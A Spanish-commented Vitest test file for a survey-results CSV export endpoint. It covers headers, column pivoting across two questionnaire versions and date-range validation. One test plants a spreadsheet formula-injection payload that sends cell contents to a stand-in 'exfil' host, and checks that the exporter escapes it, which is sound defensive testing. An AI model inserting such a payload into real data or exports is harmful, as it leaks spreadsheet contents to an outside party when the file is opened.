// GET|HEAD /api/encuestas/export.csv: rango obligatorio, cabeceras, BOM y —lo
// específico de este módulo— la UNIÓN de columnas de los dos cuestionarios: el
// pivoteo del JSONB de aprobación por gobernante (v3), el de P5 a las 7 columnas
// fijas del catálogo v1 y el aplanado de P6, con las columnas de la otra versión
// vacías en cada fila.
//
// Solo se sustituye el iterador: ENCUESTAS_CSV_HEADERS, toCsvRow y csvEscape son
// los reales, que es justo lo que se está comprobando que se emite. La BD no se
// toca.

import express, { NextFunction, Request, Response } from 'express';
import request from 'supertest';
import { describe, expect, it, vi } from 'vitest';

vi.mock('../../src/lib/prisma', () => ({ default: {} }));

const registrado = vi.hoisted(() => ({
  error: vi.fn(),
  warn: vi.fn(),
  info: vi.fn(),
  debug: vi.fn(),
}));
vi.mock('../../src/lib/logger', () => ({ logger: registrado }));

const iterateForExport = vi.hoisted(() => vi.fn());
vi.mock('../../src/services/encuestasRevisionService', async (importOriginal) => {
  const real = await importOriginal<typeof import('../../src/services/encuestasRevisionService')>();
  return { ...real, iterateForExport };
});

import encuestasRouter from '../../src/routes/encuestasRevisionRouter';
import { errorHandler } from '../../src/middlewares/errorHandler';
import { Roles } from '../../src/middlewares/roleMiddleware';
import {
  ENCUESTAS_CSV_HEADERS,
  type EncuestaExportRow,
} from '../../src/services/encuestasRevisionService';

function crearApp() {
  const app = express();
  // El authMiddleware (JWT) vive en el montaje de index.ts; aquí basta la
  // identidad que el requireRole del router espera encontrar.
  app.use((req: Request, _res: Response, next: NextFunction) => {
    req.user = { userId: 1, email: 'revisor@flotillas.invalid', role: Roles.REVISOR_QA };
    next();
  });
  app.use('/api/encuestas', encuestasRouter);
  app.use(errorHandler);
  return app;
}

const RUTA = '/api/encuestas/export.csv';
const FILTRO = { dateFrom: '2026-07-01', dateTo: '2026-07-31' };
const ENCABEZADOS = ENCUESTAS_CSV_HEADERS.join(',');

// Orden de los gobernantes en el pivoteo del CSV (debe coincidir con GOBERNANTES_V3).
const GOBERNANTES_ESPERADOS = ['sheinbaum', 'jara', 'huerta'];

type Encabezado = (typeof ENCUESTAS_CSV_HEADERS)[number];

/**
 * Celda de una fila por nombre de columna. Vale un split ingenuo por comas
 * porque ninguna fixture mete comas dentro de una celda; la fila que sí las
 * lleva (la del =HYPERLINK) se comprueba por texto completo.
 */
function celda(linea: string, encabezado: Encabezado): string {
  return linea.split(',')[ENCUESTAS_CSV_HEADERS.indexOf(encabezado)];
}

function encuestaCompletada(overrides: Partial<EncuestaExportRow> = {}): EncuestaExportRow {
  return {
    id: 1,
    idRemoto: '7a1d9c22-1f4e-4f2a-9d3b-5c6e7f8a9b01',
    idLocal: '3f2504e0-4f89-41d3-9a0c-0305e82c3301',
    folioLocal: 'LX-1042',
    encuestador: 'María López',
    recibidoEn: new Date('2026-07-30T10:07:05.000Z'),
    fechaHoraInicio: new Date('2026-07-30T10:00:00.000Z'),
    fechaHoraFinalizacion: new Date('2026-07-30T10:06:40.000Z'),
    duracionSegundos: 400,
    estado: 'completada',
    // Las filas v3 no traen elegibilidad: la columna es del contrato v1.
    elegibilidad: null,
    versionCuestionario: 3,
    sexo: 'mujer',
    rangoEdad: '30_44',
    // Listas de nombres en el orden del encuestador.
    empresariosConocidos: ['Carlos Slim', 'Marianna Sarlat'],
    politicosConocidos: ['López Obrador', 'Cortés Mendoza'],
    conoceLalo: 'si',
    rolLalo: 'empresario',
    opinionLalo: 'fuerte',
    preferenciaElectoral: 'lalo_ximenez',
    preferenciaPartido: 'morena',
    // Pivoteo: [{ gobernante: 'sheinbaum', calificacion: 'fuerte' }, ...]
    aprobacionPorGobernante: [
      { gobernante: 'sheinbaum', calificacion: 'fuerte' },
      { gobernante: 'jara', calificacion: 'regular' },
      { gobernante: 'huerta', calificacion: 'debil' },
    ],
    // Bloque v1: NULL en una fila v3, tal como lo persiste la ingesta.
    credencialVigente: null,
    genero: null,
    partidoPreferido: null,
    conocimientoPorPersona: null,
    mediosConocimiento: null,
    mayorPersonalidad: null,
    candidatoPreferido: null,
    ubicacionDisponible: true,
    ubicacionLat: 19.432608,
    ubicacionLng: -99.133209,
    ubicacionPrecisionM: 8.5,
    ubicacionEsValida: true,
    ubicacionCapturadaAt: new Date('2026-07-30T10:06:30.000Z'),
    ubicacionPermiso: 'concedido',
    ubicacionServicioActivo: true,
    ubicacionMotivoNoDisponible: null,
    dispositivoPlataforma: 'android',
    dispositivoModelo: 'Moto G54',
    dispositivoVersionSistema: '14',
    versionAplicacion: '1.0.3',
    dispositivo: { id: 3, identificador: 'encuestador-01' },
    ...overrides,
  };
}

/**
 * Fila del cuestionario v1: llena su bloque de columnas y deja en NULL las de
 * v3, que es el reverso exacto de encuestaCompletada. `rangoEdad` es la única
 * columna que comparten las dos versiones (catálogos disjuntos).
 */
function encuestaV1(overrides: Partial<EncuestaExportRow> = {}): EncuestaExportRow {
  return encuestaCompletada({
    id: 2,
    idRemoto: '7a1d9c22-1f4e-4f2a-9d3b-5c6e7f8a9b02',
    idLocal: '3f2504e0-4f89-41d3-9a0c-0305e82c3302',
    folioLocal: null,
    // Capturada por una app anterior al campo: la columna sale vacía.
    encuestador: null,
    elegibilidad: 'elegible',
    versionCuestionario: 1,
    credencialVigente: 'si',
    genero: 'hombre',
    partidoPreferido: 'pri',
    // Desordenadas a propósito: el CSV las coloca por catálogo, no por el orden
    // en que las mandó el teléfono.
    conocimientoPorPersona: [
      { persona: 'ernesto_montero', nivel: 'no_conoce' },
      { persona: 'lalo_ximenez', nivel: 'bien' },
      { persona: 'laura_estrada', nivel: 'algo' },
      { persona: 'paco_nino', nivel: 'poco' },
      { persona: 'gabriela_delgado', nivel: 'no_conoce' },
      { persona: 'irineo_molina', nivel: 'bien' },
      { persona: 'goyo_castaneda', nivel: 'poco' },
    ],
    mediosConocimiento: { tipo: 'respondida', medios: ['labor_social', 'redes_sociales'] },
    mayorPersonalidad: 'lalo_ximenez',
    candidatoPreferido: 'irineo_molina',
    // Bloque v3: NULL en una fila v1.
    sexo: null,
    empresariosConocidos: null,
    politicosConocidos: null,
    conoceLalo: null,
    rolLalo: null,
    opinionLalo: null,
    preferenciaElectoral: null,
    preferenciaPartido: null,
    aprobacionPorGobernante: null,
    ubicacionDisponible: false,
    ubicacionLat: null,
    ubicacionLng: null,
    ubicacionPrecisionM: null,
    ubicacionEsValida: null,
    ubicacionCapturadaAt: null,
    ubicacionPermiso: 'denegado',
    ubicacionServicioActivo: true,
    ubicacionMotivoNoDisponible: 'permisoDenegado',
    ...overrides,
  });
}

describe('HEAD /api/encuestas/export.csv', () => {
  it('sin rango de fechas responde 400 y no consulta nada', async () => {
    const response = await request(crearApp()).head(RUTA);

    expect(response.status).toBe(400);
    expect(iterateForExport).not.toHaveBeenCalled();
  });

  it('con rango válido emite cabeceras sin tocar la BD ni devolver cuerpo', async () => {
    const response = await request(crearApp()).head(RUTA).query(FILTRO);

    expect(response.status).toBe(200);
    expect(response.headers['content-type']).toContain('text/csv');
    expect(response.headers['content-disposition']).toContain(
      'encuestas-2026-07-01_2026-07-31.csv',
    );
    expect(response.headers['cache-control']).toBe('private, no-store');
    expect(response.text ?? '').toBe('');
    expect(iterateForExport).not.toHaveBeenCalled();
  });
});

describe('GET /api/encuestas/export.csv', () => {
  it('sin filas entrega BOM + la fila de encabezados con 200', async () => {
    // eslint-disable-next-line require-yield
    iterateForExport.mockImplementation(async function* () {});

    const response = await request(crearApp()).get(RUTA).query(FILTRO);

    expect(response.status).toBe(200);
    expect(response.headers['content-type']).toContain('text/csv');
    // El archivo es exactamente BOM + encabezados: ni una columna de más.
    expect(response.text).toBe(`\uFEFF${ENCABEZADOS}\r\n`);
    // La unión de los dos cuestionarios: 36 columnas v3 + 15 v1.
    expect(ENCUESTAS_CSV_HEADERS).toHaveLength(51);
    // Ni el body crudo ni su hash tienen columna en el CSV.
    expect(ENCUESTAS_CSV_HEADERS.some((h) => /payload|hash/i.test(h))).toBe(false);
  });

  it('reenvía los filtros del revisor al servicio (sin estado en v3)', async () => {
    // eslint-disable-next-line require-yield
    iterateForExport.mockImplementation(async function* () {});

    await request(crearApp())
      .get(RUTA)
      .query({ ...FILTRO, dispositivo: 'encuestador' });

    expect(iterateForExport.mock.calls[0][0]).toEqual({
      dispositivo: 'encuestador',
      dateFrom: '2026-07-01',
      dateTo: '2026-07-31',
    });
  });

  it('cada fila llena las columnas de SU versión y deja vacías las de la otra', async () => {
    iterateForExport.mockImplementation(async function* () {
      yield [encuestaCompletada(), encuestaV1()];
    });

    const response = await request(crearApp()).get(RUTA).query(FILTRO);

    expect(response.status).toBe(200);
    expect(response.headers['content-disposition']).toContain(
      'encuestas-2026-07-01_2026-07-31.csv',
    );

    const lineas = response.text.split('\r\n');
    expect(lineas[0]).toBe(`\uFEFF${ENCABEZADOS}`);
    // La fila tiene tantas celdas como encabezados; el número exacto lo manda
    // ENCUESTAS_CSV_HEADERS, no una constante repetida aquí.
    expect(lineas[1].split(',')).toHaveLength(ENCUESTAS_CSV_HEADERS.length);
    expect(lineas[2].split(',')).toHaveLength(ENCUESTAS_CSV_HEADERS.length);
    expect(lineas[3]).toBe('');

    // Quien levantó la encuesta, tal como lo tecleó el teléfono.
    expect(celda(lineas[1], 'Encuestador')).toBe('María López');

    // Listas de nombres unidas con ;
    expect(celda(lineas[1], 'Empresarios conocidos')).toBe('Carlos Slim;Marianna Sarlat');
    expect(celda(lineas[1], 'Políticos conocidos')).toBe('López Obrador;Cortés Mendoza');

    // Pivoteo de aprobación por gobernante.
    expect(celda(lineas[1], 'Aprobación sheinbaum')).toBe('fuerte');
    expect(celda(lineas[1], 'Aprobación jara')).toBe('regular');
    expect(celda(lineas[1], 'Aprobación huerta')).toBe('debil');

    // Y las columnas del contrato v1 salen vacías en una fila v3.
    expect(celda(lineas[1], 'Elegibilidad')).toBe('');
    expect(celda(lineas[1], 'Credencial vigente')).toBe('');
    expect(celda(lineas[1], 'Género')).toBe('');
    expect(celda(lineas[1], 'Partido preferido')).toBe('');
    expect(celda(lineas[1], 'Conoce lalo_ximenez')).toBe('');
    expect(celda(lineas[1], 'Medios (tipo)')).toBe('');
    expect(celda(lineas[1], 'Medios')).toBe('');
    expect(celda(lineas[1], 'Mayor personalidad')).toBe('');
    expect(celda(lineas[1], 'Candidato preferido')).toBe('');

    // Fechas en UTC y booleanos como si/no.
    expect(celda(lineas[1], 'Recibido (UTC)')).toBe('2026-07-30T10:07:05.000Z');
    expect(celda(lineas[1], 'Finalización (UTC)')).toBe('2026-07-30T10:06:40.000Z');
    expect(celda(lineas[1], 'Captura GPS (UTC)')).toBe('2026-07-30T10:06:30.000Z');
    expect(celda(lineas[1], 'Ubicación disponible')).toBe('si');
    expect(celda(lineas[1], 'Ubicación válida')).toBe('si');
    // Las coordenadas NO llevan apóstrofo: son números, no fórmulas.
    expect(celda(lineas[1], 'Longitud')).toBe('-99.133209');

    // La fila v1: su bloque lleno…
    expect(celda(lineas[2], 'Elegibilidad')).toBe('elegible');
    expect(celda(lineas[2], 'Credencial vigente')).toBe('si');
    expect(celda(lineas[2], 'Género')).toBe('hombre');
    expect(celda(lineas[2], 'Partido preferido')).toBe('pri');
    expect(celda(lineas[2], 'Mayor personalidad')).toBe('lalo_ximenez');
    expect(celda(lineas[2], 'Candidato preferido')).toBe('irineo_molina');
    // Cada nivel de P5 bajo la columna de SU persona, con el orden del catálogo v1.
    expect(celda(lineas[2], 'Conoce lalo_ximenez')).toBe('bien');
    expect(celda(lineas[2], 'Conoce laura_estrada')).toBe('algo');
    expect(celda(lineas[2], 'Conoce paco_nino')).toBe('poco');
    expect(celda(lineas[2], 'Conoce gabriela_delgado')).toBe('no_conoce');
    expect(celda(lineas[2], 'Conoce irineo_molina')).toBe('bien');
    expect(celda(lineas[2], 'Conoce goyo_castaneda')).toBe('poco');
    expect(celda(lineas[2], 'Conoce ernesto_montero')).toBe('no_conoce');
    // P6: el orden lo fija MEDIOS_V1, no el del teléfono (que los mandó al revés).
    expect(celda(lineas[2], 'Medios (tipo)')).toBe('respondida');
    expect(celda(lineas[2], 'Medios')).toBe('redes_sociales;labor_social');

    // …y las columnas v3 vacías (celdas vacías, no la palabra "null").
    expect(celda(lineas[2], 'Encuestador')).toBe('');
    expect(celda(lineas[2], 'Sexo')).toBe('');
    expect(celda(lineas[2], 'Empresarios conocidos')).toBe('');
    expect(celda(lineas[2], 'Políticos conocidos')).toBe('');
    expect(celda(lineas[2], 'Conoce Lalo')).toBe('');
    expect(celda(lineas[2], 'Preferencia electoral')).toBe('');
    expect(celda(lineas[2], 'Preferencia partido')).toBe('');
    expect(celda(lineas[2], 'Aprobación sheinbaum')).toBe('');
    expect(celda(lineas[2], 'Aprobación jara')).toBe('');
    expect(celda(lineas[2], 'Aprobación huerta')).toBe('');
    // Compartida por las dos versiones: en v1 lleva su propio catálogo.
    expect(celda(lineas[2], 'Rango edad')).toBe('30_44');
    expect(celda(lineas[2], 'Ubicación disponible')).toBe('no');
    // NULL no es "no": la lectura de GPS no existe, no es que fuera inválida.
    expect(celda(lineas[2], 'Ubicación válida')).toBe('');
    expect(celda(lineas[2], 'Captura GPS (UTC)')).toBe('');
    expect(celda(lineas[2], 'Servicio ubicación activo')).toBe('si');
    expect(celda(lineas[2], 'Motivo no disponible')).toBe('permisoDenegado');

    expect(registrado.error).not.toHaveBeenCalled();
  });

  // Texto libre de listas del encuestador que llega con una API key válida: sin
  // neutralizar, Excel ejecuta la celda al abrir el archivo.
  it('neutraliza una fórmula inyectada en la lista de políticos conocidos', async () => {
    iterateForExport.mockImplementation(async function* () {
      yield [encuestaCompletada({ politicosConocidos: ['=HYPERLINK("http://exfil/?"&A2,"ok")', 'López Obrador'] })];
    });

    const response = await request(crearApp()).get(RUTA).query(FILTRO);

    expect(response.status).toBe(200);
    // La lista se une con ; y escapa la entrada con la fórmula.
    expect(response.text).toContain(`"'=HYPERLINK(""http://exfil/?""&A2,""ok"");López Obrador"`);
    // No debe aparecer como celda sin escape (inicio de fórmula sin comilla):
    // si la fórmula hubiera llegado sin escape, vería ,=HYPERLINK sin comilla tras la coma.
    expect(response.text).not.toContain('Políticos conocidos,=HYPERLINK');
  });

  it('rechaza con 400 un rango mayor a 366 días', async () => {
    const response = await request(crearApp())
      .get(RUTA)
      .query({ dateFrom: '2025-01-01', dateTo: '2026-07-31' });

    expect(response.status).toBe(400);
    expect(response.body.details).toContainEqual({
      field: 'dateTo',
      message: 'El rango máximo de exportación es 366 días',
    });
    expect(iterateForExport).not.toHaveBeenCalled();
  });

  it('acepta el rango límite de 366 días', async () => {
    // eslint-disable-next-line require-yield
    iterateForExport.mockImplementation(async function* () {});

    // 2026-01-01 … 2027-01-01 inclusive = 366 días.
    const response = await request(crearApp())
      .get(RUTA)
      .query({ dateFrom: '2026-01-01', dateTo: '2027-01-01' });

    expect(response.status).toBe(200);
  });
});
